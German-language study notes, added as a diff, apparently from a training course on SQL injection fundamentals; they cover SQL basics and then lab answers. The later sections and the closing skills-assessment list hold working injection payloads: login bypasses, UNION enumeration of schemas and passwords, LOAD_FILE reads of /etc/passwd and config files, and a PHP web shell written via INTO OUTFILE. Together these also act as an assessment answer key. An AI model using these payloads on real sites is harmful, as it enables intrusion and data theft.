@@ -1,0 +1,327 @@
+Sql Injection Fundamentals
+Table of Contents
+1. Introduction:
+- Die meisten Webanwendungen verwenden eine Datenbank Management System(DBMS)
+- Anfragen werden von einem Application Server an das DBMS weitergeleitet
+- Wenn die Datenbankabfrage Usersinput enthaellt koennen wir diesen Input ausnutzen
+- Dieser Angriff wird SQL Injectin genannt
+
+- SQL Injection(SQLi):
+	- Bei einer SQL Injection manipulieren wir den Input der zu einer Datenbank geschickt wird
+	- Wir muessen den Input fuer den Userinput beenden um danach eine Anweisung einzuschieben
+	- Der Userinput wird entweder mit einem ' oder mit einem " geschlossen
+	- In SQL koennen mehrere Abfrufe hintereinander ausgefuehrt werden
+	- Wir koennen stacked -oder Union Abfragen verwenden
+
+- Use Cases and Impact:
+	- SQL Injections koennen eine grossen Auswirkung haben vorallem wenn Rechte auf dem SQL Server nicht gut verwaltet werden
+
+#####################################################################################
+Databases
+1. Intro to Databases:
+- Es gibt verschiedene Arten von DBMS
+
+- Database Management Systems:
+	- Es gibt Datei basierte, Relationale, NoSQL, Graph basiert usw DBMS
+
+2. Types of Databases:
+- Es gibt zwei verschiedene Arten von Datenbanken, relationale und nicht-relationale Datenbanken
+
+- Relational Databases:
+	- Relationale Datenbanken speichern Daten in einer Datenstruktur(Tabellen)
+	- Tabellen koennen zu einander Beziehungen haben und haben mindestens ein Schluessel mit denen sich die Tabellen miteinandere verbinden koennen
+
+- Non-relational Databases:
+	- Non-relational Datenbanken auch NoSQL Datenbanken gennant
+	- Sie werden nicht in einer festen Struktur gespeichert 
+	- Wenn Datensaetze nicht gut definiert sind, ist eine NoSQL Datenbank eine gute Wahl
+
+#####################################################################################
+MySQL
+1. Intro to MySQL:
+- Structured Query Language(SQL):
+	- SQL kann mehrere Funktionen erfuellen hirzu gehoeren:
+		- Daten ausgeben
+		- Daten updaten
+		- Daten loeschen
+		- usw
+
+- Command Line:
+	- Mit dem Tool mysql koennen wir uns mit einer MySQL Datenbank verbinden
+	- Mit der Option -u legen wir den User fest und mit -p legen wir das Passwort fest
+	- Mit -h und -P koennen wir URL und Port festlegen
+	- mysql -u <User> -p <Password> -h <Url> -P <Port>
+
+- Creating a database:
+	- Wenn wir mit mysql eingeloggt sind koennen wir uns SQL Befehle ausfuehren
+	- Mit Show Database koennen die Datenbanken ausgegeben werden
+	- Mit Create Database kann eine neue Datenbank auf dem Server angelegt werden
+
+- Tables:
+	- MySQL speichert Daten in Tabellen
+	- Eine Tabelle hat mehrere Spalten
+
+- Table Properties:
+	- Wenn eine Tabelle angelegt wird koennen fuer jede Spalte Attribute angelegt werden
+	- Wie auto_increment usw
+
+Question:
+	- mysql -u root -h 188.166.144.53 -P 30259 -p
+
+2. SQL Statements:
+- INSERT Statement:
+	- Insert Statements werden verwendet um Dateisaetze in eine Tabelle einzufuegen
+	- In Tabelle in alle Spalten Daten einfuegen
+		- INSERT INTO table_name VALUES (column1_value, column2_value, column3_value, ...);
+	- In Tabelle in manche Spalten Daten einfuegen
+		- INSERT INTO table_name(column2, column3, ...) VALUES (column2_value, column3_value, ...);
+
+- SELECT Statement:
+	- Gibt die Daten aus der Tabelle aus
+	- SELECT column1, column2 FROM table_name;
+
+- DROP Statement:
+	- Loescht Tabellen aus der Datenbank
+	- DROP TABLE table_name;
+
+- ALTER Statement:
+	- Wir koennen mit ALTER eine Tabelle oder Spalte aendern
+	- Eine neue Spalte hinzufuegen:
+		- ALTER TABLE table_name ADD newColumn TYPE;
+	- Den Spaltennamen aendern:
+		- ALTER TABLE table_name RENAME COLUMN newColumn TO oldColumn;
+	- Spaltentypen aendern:
+		- ALTER TABLE table_name MODIFY oldColumn NEW_TYPE;
+	- Spalte loeschen:
+		- ALTER TABLE table_name DROP oldColumn;
+
+- UPDATE Statement:
+	- Wir koennen Daten in einer Tabelle aendern
+	- UPDATE table_name SET column1=newvalue1, column2=newvalue2, ... WHERE <condition>;
+
+- Questions:
+	- mysql -u root -h 138.68.128.189 -P 30194 -p
+		- USE EMPLOYEES;
+		- SHOW TABLES;
+		- SELECT * FROM departments WHERE dept_name = "Development";
+
+3. Query Results:
+- Sorting Results:
+	- Wir koenen die Resultate mit ORDER BY sortieren
+	- SELECT * FROM table_name ORDER BY column_name;
+	- Wir koennen die Resultatet mit DESC absteigend oder mit ASC aufsteigend sortieren
+
+- LIMIT Results:
+	- Mit Limit koennen wir die Anzahl von Ausgaben limitieren
+	- SELECT * FROM table_name LIMIT Limit_counter;
+
+- WHERE Clause:
+	- Filtert oder Sucht nach spezifischen Daten
+	- SELECT * FROM table_name WHERE <condition>;
+
+- Like Clause:
+	- Filtert nach einem Muster in den Daten in einer Tabelle
+	- SELECT * FROM table_name WHERE username LIKE '%Muster%';
+	- % steht fuer alle andere Zeichen die dafuer stehen koennen
+
+- Questions:
+	- mysql -u root -h 138.68.128.189 -P 30194 -p
+		- USE employees;
+		- SHOW Tables;
+		- select * from employees where first_name like 'Bar%' AND hire_date = '1990-01-01';
+
+4. SQL Operators:
+- Wir koennen Konditionen mit logischen Operatoren miteinander verbinden
+
+- AND Operator:
+	- Mit einem AND Operator werden mehrere Konditionen mit einem logischem AND miteinander verbunden
+
+- OR Operator:
+	- Mit einem OR Operator koenen wir mehrere Konditionen mit einem logischen OR miteinander verbinden
+
+- NOT Operator:
+	- Ein NOT Operator negiert eine Kondition
+
+- Symbol Operators:
+	- AND,OR und NOT Operatoren koennen auch als Symbole geschrieben werden &&, || und !
+
+- Question:
+	- mysql -u root -h 138.68.128.189 -P 30197 -p
+		- SHOW DATABASES;
+		- USE employees;
+		- SHOW Tables;
+		- select * from titles where emp_no > 10000 OR title NOT LIKE '*engineer*';
+
+#####################################################################################
+SQL Injections
+1. Intro to SQL Injections:
+- Wir muessen den Userinputs beenden damit wir dannach andere Befehle ausfuehren koennen 
+
+2. Subverting Query Logic:
+- Wir koennen die originale Abfrage mit einem OR manipulieren und somit Web Authentifizierungen umgehen
+
+- SQLi Discovery:
+	- Zuerst versuchen wir verschiedene Moeglichkeiten von SQL Injections
+	- Wir koennne verschiedene Zeichen in unsere Eingabefeld mitgeben wie ', ", #, ;, ), usw
+	- In manchen Faellen wenn wir mit HTTP Get Anfragen arbeiten muessen diese Zeichen URL encoded werden
+
+- OR Injection:
+	- Wir koennen eine OR Operation hinzufuegen, sodass die Abfrage immer wahr ist
+	- SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';
+	- Hierbei muesen wir den Usernamen wissen, damit die Abfrage wahr ist
+
+- Question:
+	- tom' or '1' = '1
+
+3. Using Comments:
+- Comments:
+	- In SQL koennen auch Kommentare verwendet werden um den nachfolgenden Part zu ignorieren
+	- Wir koenen --, und # verwenden um eine Line auszukommentieren
+
+- Auth Bypass with comments:
+	- SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';
+	- SELECT * FROM logins WHERE username='admin'# ' AND password = 'something';
+
+- Question:
+	- ' or id = 5 ) #
+
+4. Union Clause:
+- Wir koennen ebenso mit Union die SQL Abfrage manipulieren
+
+- Union:
+	- Mit Union koennen wir zwei Abfragen miteinander verbinden
+	- Hiermit koennen wir Abfragen fuer andere Tabellen in einer Abfrage vereinen
+
+- Even Columns:
+	- Fuer Union benoetigen wir die gleiche Anzahl an Spalten
+
+- Un-even Columns:
+	- Wenn wir eine ungleiche Anzahl an Spalten bei der Abfrage haben koennen wir diese erweitern
+	- SELECT column_name, 2 from table_name
+	- Hiermit haben geben wir zwei Spalten aus
+
+- Question:
+	- mysql -u root -h 157.245.33.122 -P 30283 -p
+	- use employees;
+	- select * from employees UNION select *,1,1,1,1 from departments;
+
+5. Union Injection:
+- Union kann auch fuer eine Injection verwendet werden
+
+- Detect number of columns:
+	- Bevor wir Union ausnutzen koennen muessen wir die Spaltenanzahl kennen
+	- Hierfuer koennen wir Order by oder Union verwenden
+	
+	- Order by:
+		- Wir koennen die order by funktion immer weiter erhoehen bis das order by fehlschlaeft
+		- ' order by 2-- -
+
+	- Union:
+		- Wir koennen ein UNION Statement schreiben und die Anzahl von Spalten im Union immer erhoehen
+		- ' UNION select 1,2,3,4-- -
+
+- Location of Injection:
+	- Es kann sein das nur manche Spalten ausgegeben werden
+	- Das Feld ID wird meistens ignoriert und nicht ausgegeben unser Payload muss also in ein Feld geschrieben werden, dass auch ausgegeben wird
+
+Question:
+	- aa' UNION select 1,user(),3,4-- -
+
+#####################################################################################
+Exploitation
+1. Database Enumeration:
+- MySQL Fingerprinting:
+	- Bevor wir die Datenbank exploiten koennen muessen wir ueber diese Informationen sammeln
+	- Wenn wir einen einen vollstaendigen Abfragenoutput haben koennen wir SELECT @@version verwenden
+	- Wenn wir einen numerischen Output haben koennen wir SELECT POW(1,1) verwenden 
+	- Wenn wir einen Blind oder keinen Output haben koennen wir SELECT SLEEP(5) verwenden
+
+- INFORMATION_SCHEMA Database:
+	- Um ein Select Statement auszugeben muessen wir eine 3 essentielle Informationen haben:
+		- Liste der Datenbanken
+		- Liste der Tabellen in einer Datenbanl
+		- Liste von Spalten in einer Datenbank
+	- Die INFORMATION_SCHEMA Datenbank enthaelt alle Metadaten ueber alle Datenbanken und Tabellen
+
+- SCHEMATA:
+	- Wir koennen uns die Tabelle SCHEMATA in der INFORMATION_SCHEMA Datenbank anzeigen lassen
+	- Die Spalte SCHEMA_NAME enthaelt alle Datenbanken
+	- cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
+
+- TABLES:
+	- Die TABLES Tabelle in der Datenbank INFORMATION_SCHEMA beinhaltet alle Informationen ueber alle Tabellen in einer Datenbank
+	- Die Spalte TABLE_NAME beinhaltet die Tabellennamen
+	- Die Spalte TABLE_SCHEMA beinhaltet die Datenbank zu der die Tabelle gehoert
+
+- COLUMNS:
+	- In der COLUMNS Tabelle in der Datenbank INFORMATION_SCHEMA koennen wir die Spaltennamen der Tabelle einsehen
+	- Die Tabelle COLUMNS enthaelt die Spaltenname(COLUMN_NAME) den Tabellennamen(TABLE_NAME) und den den Datenbanknamen(TABLE_SCHEMA)
+
+- Data:
+	- Wenn wir die gesamten Daten haben koennen wir die Daten in der Tabelle abrufen
+	-cn' UNION select 1, COLUMN_1, COLUMN_2, 4 from Database_name.Table_name-- -
+
+Question:
+	- cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='users'-- -
+	- cn' UNION select 1, password, 3, 4 from ilfreight.users where username = 'newuser' -- -
+
+2. Reading Files:
+- Wir koennen mit SQL Injections ebenso Dateien aus einer Datenbank lesen und schreiben
+
+- Privileges:
+	- In MySQL benoetigt der User ein FILE Privilege um Dateien zu laden
+
+- DB User:
+	- Zunaechst muessen wir bestimmen welche User es gibt und 
+	- Mit CURRENT_USER() wird der derzeitige User ausgegeben
+
+- User Privileges:
+	- Jetzt kennen wir unseren User jetzt muessen wir die Privilegien ausgeben
+	- SELECT super_priv FROM mysql.user gibt aus ob wir Super Admin Rechte haben mit dem user
+
+- LOAD_FILE:
+	- Um Dateien zu laden koennen wir die Funktion LOAD_FILE() verwenden
+	- cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
+
+Question:
+	- cn' UNION SELECT 1, LOAD_FILE("/var/www/html/config.php"), 3, 4-- -
+
+3. Writing Files:
+- In Datenbanken koennen wir ebenso Dateien schreiben
+- Um Dateien schreiben zu koennen benoetigen wir 3 Rechte:
+	- File Rechte muss aktiviert sein
+	- secure_file_priv Variable nicht aktiviert
+	- Schreibrechte auf dem Backend Server
+
+- secure_file_priv:
+	- secure_file_priv gibt an welche Dateien gelesen und geschrieben werden duerfen wenn diese Variable leer ist darf im gesamten Dateisystem geschrieben und gelesen werden
+	- Mit NULL darf ueberall geschrieben und gelesen werden
+
+- SELECT INTO OUTFILE:
+	- SELECT INTO OUTFILE Statement schreibt die Ausgabe in eine lokalen Datei
+	- SELECT * from users INTO OUTFILE '/tmp/credentials';
+
+- Writing Files through SQL Injection:
+	- select 'file written successfully!' into outfile '/var/www/html/proof.txt'
+
+- Writing a Web Shell:
+	- Durch eine SQL Injection koennen wir eine Web Shell bekommen
+	- <?php system($_REQUEST[0]); ?>
+	- cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
+
+Question:
+	- cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
+	- http://206.189.114.209:30001/shell.php?0=cat%20../flag.txt
+
+#####################################################################################
+Closing It Out
+1. Skills Assessment - SQL Injection Fundamentals:
+- admin 'OR 1=1#
+- ' UNION select 1,2,3,4,5-- -
+- ' UNION SELECT 1,2, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
+- ' UNION SELECT 1,2, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
+- ' UNION SELECT 1, variable_name, variable_value, 4, 5 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
+- ' union select 1,'file written successfully!',3,4,5 into outfile '/var/www/html/dashboard/proof.txt'-- -
+- ' union select "",'<?php system($_REQUEST[0]); ?>', "", "", "" into outfile '/var/www/html/dashboard/shell.php'-- -
+- ' union select "",'<?php system("dir /"); ?>', "", "", "" into outfile '/var/www/html/dashboard/shell2.php'-- -
+- ' UNION SELECT 1,LOAD_FILE("/flag_cae1dadcd174.txt"),3,4,5-- -
